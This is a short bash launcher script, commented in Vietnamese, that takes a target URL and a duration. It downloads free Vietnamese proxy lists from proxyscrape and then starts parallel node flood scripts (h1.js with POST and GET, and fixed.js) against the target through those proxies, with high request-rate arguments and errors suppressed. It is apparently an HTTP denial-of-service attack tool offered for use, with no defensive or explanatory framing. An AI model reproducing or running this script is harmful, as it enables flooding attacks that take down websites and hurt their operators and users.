#!/bin/bash

[ $# -lt 2 ] && echo "Usage: $0 {URL} {TIME}" && exit 1
URL=$1
TIME=$2

# Xóa file proxy cũ và tải proxy mới
> live.txt
for t in http https; do
  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999&protocol=$t" >> live.txt
done

sort -u live.txt -o live.txt

# Chạy các tiến trình node đồng thời, bật chế độ ignore lỗi (|| true)
for m in POST GET; do
  node h1.js $m $URL live.txt $TIME 999 10 randomstring=true || true &
  node fixed.js $URL $TIME 1 1 hihi.txt --verify true || true &
done

# Đợi tất cả tiến trình node chạy xong trước khi exit
wait
